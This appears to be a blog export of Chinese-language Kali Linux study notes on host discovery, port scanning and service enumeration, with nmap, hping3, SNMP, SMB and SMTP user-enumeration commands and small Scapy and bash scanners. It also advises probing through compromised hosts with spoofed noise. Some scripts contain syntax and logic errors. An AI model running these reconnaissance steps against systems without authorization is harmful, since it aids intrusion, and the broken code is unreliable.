<h4 id="1-主动信息收集"><a href="#1-主动信息收集" class="headerlink" title="1. 主动信息收集"></a>1. 主动信息收集</h4><ul>
<li>直接与目标系统交互通信</li>
<li>无法避免留下访问的痕迹（可能被封杀，强的流量分析，强的代码审计）</li>
<li>使用受控的第三方电脑进行探测<ul>
<li>使用代理或已被控制的主机</li>
<li>做好被封杀的准本</li>
<li>使用噪声迷惑目标，淹没真实的探测流量（伪造IP发送大量垃圾信息）</li>
</ul>
</li>
<li>扫描（IP层 → 端口层 → 服务级别的扫描）<ul>
<li>发送不同的探测，根据结果判断目标状态</li>
</ul>
</li>
</ul>
<h4 id="2-发现（IP层-→-端口层-→-服务级别的扫描）"><a href="#2-发现（IP层-→-端口层-→-服务级别的扫描）" class="headerlink" title="2. 发现（IP层 → 端口层 → 服务级别的扫描）"></a>2. 发现（IP层 → 端口层 → 服务级别的扫描）</h4><ul>
<li>识别活着的主机<ul>
<li>潜在的被攻击目标（存在的漏洞来进行利用）</li>
</ul>
</li>
<li>输出一个IP地址列表（在线IP地址）</li>
<li>2、3、4层发现</li>
</ul>
<h4 id="3-发现-二层发现（arping）"><a href="#3-发现-二层发现（arping）" class="headerlink" title="3. 发现-二层发现（arping）"></a>3. 发现-二层发现（arping）</h4><ul>
<li>优点：扫描速度快、可靠</li>
<li>缺点：不可路由（只可发现本网段的主机发现）</li>
<li>Arp协议<ul>
<li>抓包</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>OSI模型
Layer1 Physical
Layer2 Data Link       ARP
Layer3 Network         IPv4,IPv6,ICMP,and IPSec
Layer4 Transport       TCP and UDP
Layer5 Session         NetBIOS,PPTP,RPC,and SOCKS
Layer6 Presentation    ASCII,JPEG,PDF,PNG,and DOCX
Layer7 Application     HTTP,FTP,and Telnet</code></pre></blockquote>
<ul>
<li><strong><code>🔺命令：arping</code></strong></li>
<li><strong><code>🔺命令：arping IP地址 -c 1</code></strong>（发送一个ARP包）</li>
<li><strong><code>🔺命令：arping IP地址 -d</code></strong>（发现重复IP地址拥有一个MAC地址，可以发现arp地址欺骗）</li>
<li><strong><code>🔺命令：arping -c 1 Ip地址 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</code></strong></li>
<li>脚本 ▲2019.12.2新版ifconfig命令显示不同，对相应脚本进行修改<ul>
<li><strong><code>🔺命令：./arping1.sh eth0 &gt;iplist.txt</code></strong>（检查网内”存活”的计算机）</li>
</ul>
</li>
</ul>
<pre><code>#！/bin/bash
if [ &quot;$#&quot; -ne 1 ];then
    echo &quot;USAGE - ./arping.sh [interface]&quot;
    echo &quot;Example - ./arping.sh eth0&quot;
    echo &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;
    exit
fi
interface=$1
prefix=$(ifconfig $interface | grep &quot;inet&quot; | egrep -v &quot;inet6&quot; | cut -d &quot;.&quot; -f 1-3 | awk &#39;{print $2}&#39;)
for addr in $(seq 1 254);do
    arping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1
done</code></pre><ul>
<li>脚本 <ul>
<li><strong><code>🔺命令：./arping2.sh iplist.txt</code></strong>（重新检查”存活”的主机）</li>
</ul>
</li>
</ul>
<pre><code>#！/bin/bash
if [ &quot;$#&quot; -ne 1 ];then
    echo &quot;USAGE - ./arping.sh [iplist.txt]&quot;
    echo &quot;Example - ./arping.sh iplist.txt&quot;
    echo &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;
fi
file=$1
for addr in $(cat $file); do
    arping -c 1 $addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1
done</code></pre><h4 id="4-发现-二层发现（Netdiscover）"><a href="#4-发现-二层发现（Netdiscover）" class="headerlink" title="4. 发现-二层发现（Netdiscover）"></a>4. 发现-二层发现（Netdiscover）</h4><ul>
<li>Netdiscover（支持CIDR地址段显示）▲2019.12.2可抓到包，但界面不显示<ul>
<li>专门用于二层发现</li>
<li>可用于无线和交换网络环境</li>
<li>主动和被动探测</li>
</ul>
</li>
<li>主动<ul>
<li><strong><code>🔺命令：netdiscover -i eth0 -r IP地址/24</code></strong></li>
<li><strong><code>🔺命令：netdiscover -l iplist.txt</code></strong></li>
</ul>
</li>
<li>被动（把网卡制成混杂模式进行监听）<ul>
<li><strong><code>🔺命令：netdiscover -p</code></strong></li>
<li>主动arp容易触发报警</li>
</ul>
</li>
</ul>
<h4 id="5-发现-二层发现（Scapy）"><a href="#5-发现-二层发现（Scapy）" class="headerlink" title="5. 发现-二层发现（Scapy）"></a>5. 发现-二层发现（Scapy）</h4><ul>
<li>Scapy<ul>
<li>作为Python库进行调用</li>
<li>也可以作为单独的工具使用</li>
<li>抓包、分析、创建、修改、注入网络流量</li>
</ul>
</li>
<li>apt-get install python3-gnuplot（报错可安装）▲2019.12.2依然会报错，但不影响使用</li>
<li>Scapy<ul>
<li>arp=ARP（）</li>
<li>arp.pdst=”IP地址”（进行赋值）</li>
<li>answer=sr1(arp)（发生数据包）</li>
<li>answer.display() （显示数据包的结构，分层）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>ARP().dispaly()（定制一个ARP的数据包，只需要添加属性字段，ARP的包头结构）
sr1()（发送数据包）</code></pre></blockquote>
<ul>
<li>python脚本（用Scapy写的python脚本）<ul>
<li><strong><code>🔺命令：./Arp1.py 接口</code></strong> ▲2019.12.1 strip()函数报错</li>
<li><strong><code>🔺命令：./Arp2.py iplist.txt</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import logging
import subprocess
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import *

if len(sys.argv)!=2:
    print &quot;Usage - ./Arp1.py [interface]&quot;
    print &quot;Example - ./Arp1.py eth0&quot;
    print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;
    sys.exit()

interface=str(sys.argv[1])

ip=subprocess.check_output(&quot;ifconfig &quot;+interface+&quot; | grep &quot;inet&quot; | egrep -v &quot;inet6&quot; | cut -d &quot;.&quot; -f 1-3 | awk &#39;{print $2}&#39;&quot;,shell=True).strip()
prefix=ip.split(&quot;.&quot;)[0]+&quot;.&quot;+ip.split(&quot;.&quot;)[1]+&quot;.&quot;+ip.split(&quot;.&quot;)[2]+&quot;.&quot;
for addr in range(0,254):
    answer=sr1(ARP(pdst=addr.strip()),timeout=0.1,verbose=1)
    if answer==None:
      pass
    else:
      print prefix+str(addr)</code></pre><pre><code>#!/usr/bin/python
import logging
import subprocess
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import *

if len(sys.argv)!=2:
    print &quot;Usage - ./Arp2.py [iplist.txt]&quot;
    print &quot;Example - ./Arp2.py iplist.txt&quot;
    print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;
    sys.exit()

filename=str(sys.argv[1])
file=open(filename,&quot;r&quot;)

for addr in file:
    answer=sr1(ARP(pdst=addr.strip()),timeout=0.1,verbose=1)
    if answer==None:
      pass
    else:
      print addr.strip()</code></pre><h4 id="6-发现-二层发现（nmap）"><a href="#6-发现-二层发现（nmap）" class="headerlink" title="6. 发现-二层发现（nmap）"></a>6. 发现-二层发现（nmap）</h4><ul>
<li><strong><code>🔺命令：nmap IP地址-254（IP地址/24） -sn</code></strong> </li>
<li><strong><code>🔺命令：namp -iL（调用地址列表的文本文件） iplist.txt -sn | grep ^Namp</code></strong></li>
</ul>
<blockquote>
<pre><code>强大的NMAP软件，需要非常熟练
nmap的-sn参数，除了会ARP发现之外，还会进行DNS的反向域名解析</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(十七)：端口扫描--UDP</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%83)%EF%BC%9A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F--UDP/</url>
    <content><![CDATA[<hr>
<h4 id="1-端口扫描（UDP）"><a href="#1-端口扫描（UDP）" class="headerlink" title="1. 端口扫描（UDP）"></a>1. 端口扫描（UDP）</h4><ul>
<li>端口对应网络服务及应用端程序</li>
<li>服务端程序的漏洞通过端口攻入</li>
<li>发现开放的端口</li>
<li>更具体的攻击面</li>
<li>UDP端口<ul>
<li>假设ICMP port-unreachable 响应代表端口关闭（没有响应，即为端口开放）</li>
<li>目标系统不响应ICMP port-unreachable时，可能产生误判</li>
</ul>
</li>
<li>完整的UDP应用层请求<ul>
<li>准确性高</li>
<li>耗时巨大</li>
</ul>
</li>
</ul>
<h4 id="2-端口扫描（Scapy-UDP）"><a href="#2-端口扫描（Scapy-UDP）" class="headerlink" title="2. 端口扫描（Scapy-UDP）"></a>2. 端口扫描（Scapy-UDP）</h4><ul>
<li>Scapy UDP Scan<ul>
<li>端口关闭：ICMP port-unreachable</li>
<li>端口开放：没有回包</li>
<li>了解每一种基于UDP的应用包结构很有帮助</li>
<li>与三层相同的技术</li>
<li>误判</li>
</ul>
</li>
<li>Scapy<ul>
<li>sr1(IP(dst=”IP地址”)/UDP(dport=53),timeout=1,verbose=1)</li>
</ul>
</li>
<li><strong><code>🔺命令：./udp_scan.py IP地址 起始端口 结束端口</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import *
import time
import sys

if len(sys.argv)!=4:
    print &quot;Usage - ./udp_scan.py [Target IP] [First IP] [Last IP] &quot;
    print &quot;Example - ./udp_scan.py 192.168.100.1 1 200&quot;
    print &quot;Example will perform a TCP ACK scan of the 192.168.100.0/24 range&quot;
    sys.exit()

ip=sys.argv[1]
start=int(sys.argv[2])
end=int(sys.argv[3])

for port in range(start end):
    a=sr1(IP(dst=ip)/UDP(dport=port),timeout=5,verbose=0)
    time.sleep(1)
    if a==None:
      print port
    else:
      pass</code></pre><h4 id="3-端口扫描（Nmap-UDP）"><a href="#3-端口扫描（Nmap-UDP）" class="headerlink" title="3. 端口扫描（Nmap-UDP）"></a>3. 端口扫描（Nmap-UDP）</h4><ul>
<li>Nmap</li>
<li><strong><code>🔺命令：nmap -sU（端口扫描） IP地址</code></strong><ul>
<li>默认的1000个参数（不指定端口的情况下）</li>
<li>ICMP host-unreachable</li>
</ul>
</li>
<li><strong><code>🔺命令：nmap IP地址 -sU -p（指定端口） 53</code></strong></li>
<li><strong><code>🔺命令：nmap -iL iplist.txt -sU -p（指定端口范围） 1-200</code></strong></li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(十六)：主机发现--四层发现</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%85%AD)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E5%9B%9B%E5%B1%82%E5%8F%91%E7%8E%B0/</url>
    <content><![CDATA[<hr>
<h4 id="1-发现-四层发现（不对端口状态进行识别，主要是对IP是否在线进行识别）"><a href="#1-发现-四层发现（不对端口状态进行识别，主要是对IP是否在线进行识别）" class="headerlink" title="1. 发现-四层发现（不对端口状态进行识别，主要是对IP是否在线进行识别）"></a>1. 发现-四层发现（不对端口状态进行识别，主要是对IP是否在线进行识别）</h4><ul>
<li>优点<ul>
<li>可路由且结果可靠</li>
<li>不太可能被防火墙过滤</li>
<li>甚至可以发现所有端口都被过滤的主机</li>
</ul>
</li>
<li>缺点<ul>
<li>基于状态过滤的防火墙可能过滤扫描</li>
<li>全端口扫描速度慢</li>
</ul>
</li>
<li>TCP（正常过程：SYN–SYN/ACK–ACK）<ul>
<li>未经请求的ACK–RST</li>
<li>SYN–SYN/ACK、RST</li>
</ul>
</li>
<li>UDP<ul>
<li>ICMP端口不可达、一去不复返（被识别主机端口未开放UDP服务）</li>
</ul>
</li>
</ul>
<h4 id="2-发现-四层发现（Scapy-TCP）"><a href="#2-发现-四层发现（Scapy-TCP）" class="headerlink" title="2. 发现-四层发现（Scapy-TCP）"></a>2. 发现-四层发现（Scapy-TCP）</h4><ul>
<li>ACK–TCP Port–RST</li>
<li>Scapy<ul>
<li>i=IP()</li>
<li>i.dst=”IP地址”</li>
<li>t=TCP()</li>
<li>t.flags=”A”</li>
<li>r=(i/f)</li>
<li>a=sr1(r)</li>
<li>a.display()</li>
</ul>
</li>
<li>a=sr1(IP(dst=”IP地址”)/TCP(dport=80,flags=”A”),timeout=1)</li>
<li><strong><code>🔺命令：./ACK_Ping.py IP网段</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import logging
import subprocess
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import *

if len(sys.argv)!=2:
    print &quot;Usage - ./ACK_Ping.py [/24 network address]&quot;
    print &quot;Example - ./ACK_Ping.py 192.168.100.0&quot;
    print &quot;Example will perform a TCP ACK scan of the 192.168.100.0/24 range&quot;
    sys.exit()

address=str(sys.argv[1])
prefix=address.split(&quot;.&quot;)[0]+&quot;.&quot;+address.split(&quot;.&quot;)[1]+&quot;.&quot;+address.split(&quot;.&quot;)[2]+&quot;.&quot;

for addr in range(1,254):
    response=sr1(IP(dst=prefix+str(addr))/TCP(dport=2222,flags=&#39;A&#39;),timeout=0.1,verbose=0)
    try:
      if int(response[TCP].flags)==4:
        print prefix+str(addr)
    except:
        pass</code></pre><h4 id="3-发现-四层发现（Scapy-UDP）"><a href="#3-发现-四层发现（Scapy-UDP）" class="headerlink" title="3. 发现-四层发现（Scapy-UDP）"></a>3. 发现-四层发现（Scapy-UDP）</h4><ul>
<li>UDP–UDP Port–ICMP</li>
<li>Scapy<ul>
<li>i=IP()</li>
<li>u=UDP()</li>
<li>i.dst=”IP地址”</li>
<li>u.dport=33333</li>
<li>r=(i/u)</li>
<li>a=sr1(r,timeout=1,verbose=1)</li>
<li>a.display()</li>
</ul>
</li>
<li><strong><code>🔺命令：./UDP_Ping.py IP网段</code></strong>（UDP发现不可靠）</li>
</ul>
<pre><code>#!/usr/bin/python
import logging
import subprocess
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import *

if len(sys.argv)!=2:
    print &quot;Usage - ./UDP_Ping.py [/24 network address]&quot;
    print &quot;Example - ./UDP_Ping.py 192.168.100.0&quot;
    print &quot;Example will perform a UDP ICMP scan of the 192.168.100.0/24 range&quot;
    sys.exit()

address=str(sys.argv[1])
prefix=address.split(&quot;.&quot;)[0]+&quot;.&quot;+address.split(&quot;.&quot;)[1]+&quot;.&quot;+address.split(&quot;.&quot;)[2]+&quot;.&quot;

for addr in range(1,254):
    response=sr1(IP(dst=prefix+str(addr))/UDP(dport=33333),timeout=0.1,verbose=0)
    try:
      if int(response[IP].proto)==1:
        print prefix+str(addr)
    except:
        pass</code></pre><h4 id="4-发现-四层发现（Nmap）"><a href="#4-发现-四层发现（Nmap）" class="headerlink" title="4. 发现-四层发现（Nmap）"></a>4. 发现-四层发现（Nmap）</h4><ul>
<li><strong><code>🔺命令：nmap IP地址-254 -PU53（对于UDP53端口）-sn</code></strong></li>
<li><strong><code>🔺命令：nmap IP地址-254 -PA80（对于TCP80端口）-sn</code></strong></li>
<li><strong><code>🔺命令：nmap -iL iplist.txt -PA80 -sn</code></strong></li>
</ul>
<p>▲ 2019.12.3 Nmap局域网，无论是TCP还是UDP，发送的都是DNS的包，局域网内是发给网关<br>▲ 2019.12.3 Nmap外网，UDP查询时发送DNS包，TCP发送TCP包</p>
<blockquote>
<pre><code>nmap IP地址 -P0 -sn Ping层的发现
nmap IP地址 -PS -sn SCTP发现
nmap IP地址 -PE -sn ICMP echo
nmap IP地址 -PP -sn 时间戳
namp IP地址 -PM -sn 子网掩码发现
nmap 192.168.100.1-254 -PA80 -sn | grep &quot;Nmap&quot; | grep -v &quot;Starting&quot; | grep -v &quot;done&quot;| cut -d &quot; &quot; -f 6 | cut -d &quot;(&quot; -f 2| cut -d &quot;)&quot; -f 1 &gt; iplist.txt</code></pre></blockquote>
<h4 id="5-发现-四层发现（hping3）"><a href="#5-发现-四层发现（hping3）" class="headerlink" title="5. 发现-四层发现（hping3）"></a>5. 发现-四层发现（hping3）</h4><ul>
<li><strong><code>🔺命令：hping3 --udp IP地址 -c 1</code></strong></li>
<li><strong><code>🔺命令：for addr in $(seq 1 254);do hping3 --udp 1.1.1.$addr -c 1 &gt;&gt;r.txt;done</code></strong><ul>
<li><strong><code>🔺命令：grep Unreachable r.txt | cut -d &quot;&quot; -f 5 | cut -d &quot;=&quot; -f 2</code></strong></li>
<li><strong><code>🔺命令：./udp_hping.sh IP网段</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#！/bin/bash
if [ &quot;$#&quot; -ne 1 ];then
    echo &quot;USAGE - ./udp_hping.sh [/24 network address]&quot;
    echo &quot;Example - ./udp_hping.sh 192.168.100.0&quot;
    echo &quot;Example will perform an UDP scan of the 192.168.100.0/24 network and output.txt file&quot;
    exit
fi
prefix=$(echo $1 | cut -d &quot;.&quot; -f 1-3)
for addr in $(seq 1 254);do
    hping3 $prefix.$addr --udp -c 1 &gt;&gt; r.txt;
done
grep Unreachable r.txt | cut -d &quot;&quot; -f 5 | cut -d &quot;=&quot; -f 2 &gt;&gt; output.txt
rm r.txt</code></pre><ul>
<li><strong><code>🔺命令：hping3 IP地址 -c 1</code></strong>（TCP，Flag 0–ACK、RST）<ul>
<li><strong><code>🔺命令：hping3 IP地址</code></strong></li>
<li><strong><code>🔺命令：./tcp_hping.sh IP网段</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#！/bin/bash
if [ &quot;$#&quot; -ne 1 ];then
    echo &quot;USAGE - ./tcp_hping.sh [/24 network address]&quot;
    echo &quot;Example - ./tcp_hping.sh 192.168.100.0&quot;
    echo &quot;Example will perform an TCP scan of the 192.168.100.0/24 network and output.txt file&quot;
    exit
fi
prefix=$(echo $1 | cut -d &quot;.&quot; -f 1-3)
for addr in $(seq 1 254);do
    hping3 $prefix.$addr -c 1 &gt;&gt; r.txt;
done
grep Unreachable r.txt | cut -d &quot;&quot; -f 5 | cut -d &quot;=&quot; -f 2 &gt;&gt; output.txt
rm r.txt</code></pre><blockquote>
<pre><code>hping3不是发ACK的TCP包，是flag0的TCP包，需要收回ACK、RST的TCP包
nmap和Scapy发的是ACK的TCP包，是flag16的TCP包，需要收回RST的TCP包</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(十九)：服务扫描</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<hr>
<h4 id="1-服务扫描（不能简单通过端口号来判断端口上的服务）"><a href="#1-服务扫描（不能简单通过端口号来判断端口上的服务）" class="headerlink" title="1. 服务扫描（不能简单通过端口号来判断端口上的服务）"></a>1. 服务扫描（不能简单通过端口号来判断端口上的服务）</h4><ul>
<li>识别开放端口上运行的应用</li>
<li>识别目标操作系统</li>
<li>提高攻击效率<ul>
<li>Banner捕获（最主要，最简单，准确性不高）</li>
<li>服务识别</li>
<li>操作系统识别</li>
<li>SNMP分析（通过系统内部信息来进行探索）</li>
<li>防火墙识别（识别边界防火墙，过滤机制，进行绕过）</li>
</ul>
</li>
<li>Banner<ul>
<li>软件开发商</li>
<li>软件名称</li>
<li>服务类型</li>
<li>版本号（直接发现已知的漏洞和弱点）</li>
</ul>
</li>
<li>连接建立后直接获取banner</li>
<li>另类服务识别方法<ul>
<li>特征行为和响应字段（指纹信息）</li>
<li>不用的响应可用于识别底层操作系统</li>
</ul>
</li>
<li>SNMP（默认就是public，可读可写private，public可查看交换机信息）<ul>
<li>简单网络管理协议</li>
<li>Community strings</li>
<li>信息查询或重新配置</li>
</ul>
</li>
<li>识别和绕过防火墙筛选</li>
</ul>
<h4 id="2-服务扫描-Banner"><a href="#2-服务扫描-Banner" class="headerlink" title="2. 服务扫描-Banner"></a>2. 服务扫描-Banner</h4><ul>
<li><strong><code>🔺命令：nc -nv IP地址 端口号</code></strong>（查看端口banner信息）</li>
</ul>
<h4 id="3-服务扫描-Banner"><a href="#3-服务扫描-Banner" class="headerlink" title="3. 服务扫描-Banner"></a>3. 服务扫描-Banner</h4><ul>
<li>Python socket（socket缺乏对应用层数据包的定义，无法建立完整会话）<ul>
<li>socket模块用于连接网络服务</li>
</ul>
</li>
<li>python</li>
<li>import socket</li>
<li>banner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</li>
<li>banner.connet((“IP地址”,端口号))</li>
<li>banner.recv(4096)  （’220(vsftp 2.3.4)\r\n’） </li>
<li>banner.close()</li>
<li>exit()</li>
<li>Banner不允许抓取，recv函数无返回将挂起！！</li>
<li><strong><code>🔺命令：./ban_grab.py IP地址 起始端口 结束端口</code></strong>  ▲2019.12.6 暂时扫不出服务</li>
</ul>
<pre><code>#!/usr/bin/python
import socket
import select
import sys

if len(sys.argv)!=4:
    print &quot;Usage - ./ban_grab.py [Target IP] [First Port] [Last Port] &quot;
    print &quot;Example - ./ban_grab.py 192.168.100.1 1 200&quot;
    print &quot;Example will grab banners for TCP ports 1 through 100 on 192.168.100.1&quot;
    sys.exit()

ip=sys.argv[1]
start=int(sys.argv[2])
end=int(sys.argv[3])

for port in range(start,end):
    try:
      bangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      bangrab.connect((ip,port))
      ready=select.select((bangrab),[],[],1)
      if ready[0]:
        print &quot;TCP Port &quot;+str[port]+&quot;-&quot;+bangrab.recv[4096]
        bangrab.close()
    except:
      pass</code></pre><h4 id="4-服务扫描-Banner"><a href="#4-服务扫描-Banner" class="headerlink" title="4. 服务扫描-Banner"></a>4. 服务扫描-Banner</h4><ul>
<li><strong><code>🔺命令：dmitry -p（TCP扫描）IP地址</code></strong></li>
<li><strong><code>🔺命令：dmitry -pb（TCP扫描banner信息） IP地址</code></strong></li>
</ul>
<h4 id="5-服务扫描-Banner"><a href="#5-服务扫描-Banner" class="headerlink" title="5. 服务扫描-Banner"></a>5. 服务扫描-Banner</h4><ul>
<li><strong><code>🔺命令：nmap -sT（完整的TCP连接） IP地址 -p 端口 --script=banner.nse</code></strong></li>
</ul>
<blockquote>
<pre><code>nmap扫描脚本：/usr/share/nmap/script</code></pre></blockquote>
<h4 id="6-服务扫描-Banner"><a href="#6-服务扫描-Banner" class="headerlink" title="6. 服务扫描-Banner"></a>6. 服务扫描-Banner</h4><ul>
<li><strong><code>🔺命令：amap -B（专门发现指定端口上的banner信息） IP地址 端口</code></strong></li>
</ul>
<h4 id="7-服务扫描-服务识别"><a href="#7-服务扫描-服务识别" class="headerlink" title="7. 服务扫描-服务识别"></a>7. 服务扫描-服务识别</h4><ul>
<li>Banner信息抓取能力有限</li>
<li>nmap响应特征分析识别服务<ul>
<li>发现系列复杂的探测</li>
<li>依据响应特征signature</li>
</ul>
</li>
<li><strong><code>🔺命令：nv -nv IP地址 端口</code></strong></li>
<li><strong><code>🔺命令：nmap IP地址 -p 端口</code></strong>-sV（识别端口后面服务，通过指纹匹配的方式，不单是banner信息）</li>
</ul>
<h4 id="8-服务扫描-服务识别"><a href="#8-服务扫描-服务识别" class="headerlink" title="8. 服务扫描-服务识别"></a>8. 服务扫描-服务识别</h4><ul>
<li><strong><code>🔺命令：Amap</code></strong>（还是基于banner信息进行识别）</li>
<li><strong><code>🔺命令：amap IP地址</code></strong></li>
<li><strong><code>🔺命令：amap IP地址 端口号</code></strong></li>
<li><strong><code>🔺命令：amap IP地址 端口号 -q</code></strong></li>
<li><strong><code>🔺命令：amap IP地址 端口号 -qb</code></strong></li>
</ul>
<h4 id="9-SNMP扫描（通信：101和102，被查询的服务端：161，客户端：162-→-udp）"><a href="#9-SNMP扫描（通信：101和102，被查询的服务端：161，客户端：162-→-udp）" class="headerlink" title="9. SNMP扫描（通信：101和102，被查询的服务端：161，客户端：162 → udp）"></a>9. SNMP扫描（通信：101和102，被查询的服务端：161，客户端：162 → udp）</h4><ul>
<li>snmp（明文传输，可被嗅探到）<ul>
<li>信息的金矿（设备的详细内容）</li>
<li>经常被错误配置（特征字符，community）</li>
<li>public/private/mnager</li>
</ul>
</li>
<li>MIB Tree<ul>
<li>SNMP Management Information Base（MIB）</li>
<li>树形的网络设备管理功能数据库</li>
<li>1.3.6.1.4.1.77.1.2.25（OID）</li>
</ul>
</li>
<li><strong><code>🔺命令：onesixtyone IP地址 public</code></strong></li>
<li><strong><code>🔺命令：onesixtyone -c（字典） dict.txt -i（多个主机列表） host -o my.log -w 100</code></strong></li>
</ul>
<blockquote>
<pre><code>Window XP安装 → 程序软件安装 → 添加组件 → 管理和监视（有可能需要安装光盘）
services.msc snmp服务，可添加代理，陷阱（snmp作为客户端），默认安装public作为commuity，然后接受来自任何主机的SNMP查询包</code></pre></blockquote>
<h4 id="10-SNMP扫描"><a href="#10-SNMP扫描" class="headerlink" title="10. SNMP扫描"></a>10. SNMP扫描</h4><ul>
<li><strong><code>🔺命令：snmpwalk IP地址 -c public -v（snmp版本） 2c</code></strong></li>
<li>用户<ul>
<li><strong><code>🔺命令：snmp -c publuc -v 2c IP地址 1.3.6.1.4.1.77.1.2.25</code></strong>（MIB All ID）</li>
</ul>
</li>
<li><strong><code>🔺命令：snmpcheck -t</code></strong>（目标主机） IP地址（默认情况下是public，可以用-c去修改community）</li>
<li><strong><code>🔺命令：snmpcheck -t IP地址 -c private -v 2</code></strong></li>
<li><strong><code>🔺命令：snmpcheck -t IP地址 -p agent w</code></strong>（检测是否有可写权限）</li>
</ul>
<blockquote>
<pre><code>SNMP版本：v1，v2c，v3（大量安全机制）</code></pre></blockquote>
<h4 id="11-SMB扫描"><a href="#11-SMB扫描" class="headerlink" title="11. SMB扫描"></a>11. SMB扫描</h4><ul>
<li><p>Server Message Block 协议</p>
<ul>
<li>微软历史上出现安全问题最多的协议</li>
<li>实现复杂</li>
<li>默认开放</li>
<li>文件共享</li>
<li>空会话未身份认证访问（SMB1）</li>
</ul>
<ol>
<li>密码策略</li>
<li>用户名</li>
<li>组名</li>
<li>机器名</li>
<li>用户、组SID（Adminastrator在window中SID默认为500）</li>
</ol>
</li>
<li><p><strong><code>🔺命令：nmap -v（详细结果） -p 139,445 IP地址</code></strong>（较粗糙扫描，还不能判断win还是linux）</p>
</li>
<li><p><strong><code>🔺命令：nmap IP地址 -p139,445 --script=smb-os-discovery.nse</code></strong></p>
</li>
<li><p><strong><code>🔺命令：nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1（进行不安全的扫描，快，准确，可能会宕机） IP地址</code></strong> ▲2019.12.6 script无smb-check-vulns脚本</p>
</li>
<li><p><strong><code>🔺命令：nbtscan -r IP网段/24（可以扫出其他网段的MAC地址）</code></strong>▲2019.12.6测试暂不可扫出</p>
</li>
<li><p><strong><code>🔺命令：enum4linux -a IP地址</code></strong></p>
</li>
</ul>
<blockquote>
<pre><code>SMB Vulns（针对的是Window系统）
MS08-067，a windpws RPC vulnerability
Conficker，an infection by the Conficker worm
Unnamed regsc Dos，a denial-of-service vulnerability I accidentally found in windows 2000
SMBv2 exploit（CVE-2009-3103，Microsoft Security Advisory 975497）
MS06-025，a windows Ras RPC service vulnerability
MS07-029，a windows Dns Server RPC Service vulnerability
MS09-001，a windows Code execution from remote</code></pre></blockquote>
<blockquote>
<pre><code>SMB服务：
&lt;00&gt;   Workstation Service（共享别人的文件）
&lt;03&gt;   Messenger Service
&lt;20&gt;   File Server Service（对别人的文件共享）
&lt;1e&gt;   Browser Service Elections（浏览器服务）
▲ window下主机的SID  用户的RID
▲ linux下主机 uid，gid，groups</code></pre></blockquote>
<h4 id="12-SMTP扫描（发现目标系统的邮件账号，也可以通过被动信息收集）"><a href="#12-SMTP扫描（发现目标系统的邮件账号，也可以通过被动信息收集）" class="headerlink" title="12. SMTP扫描（发现目标系统的邮件账号，也可以通过被动信息收集）"></a>12. SMTP扫描（发现目标系统的邮件账号，也可以通过被动信息收集）</h4><ul>
<li><strong><code>🔺命令：nc -nv IP地址 端口</code></strong><ul>
<li>VRFY root（确认有无root账号）</li>
</ul>
</li>
<li><strong><code>🔺命令：nmap smtp.163.com -p 25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods=VRFY</code></strong>（后面可加参数指定字典文件）</li>
<li><strong><code>🔺命令：nmap smtp.163.com -p 25 --script=smtp-open-relay.nse --script=smtp-user-enum -M VRFY -U（指定字典） user.txt -t IP地址</code></strong></li>
<li><strong><code>🔺命令：./smtp.py &lt;username&gt;</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python

import socket
import sys

if len(sys.argv)!=2:
    print &quot;Usage: smtp.py &lt;username&gt;&quot;
    sys.exit(0)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((&quot;IP地址&quot;,端口))
banner=s.recv(4096)
print banner+&quot;aaaaa&quot;
s.send(&#39;VRFY&#39;+sys.argv[1]+&#39;\r\n&#39;)
result=s.recv(4096)
print result
s.close</code></pre><blockquote>
<pre><code>邮件服务器开放中继，允许其他人用邮件服务器对其他人发邮件，成为肉鸡</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
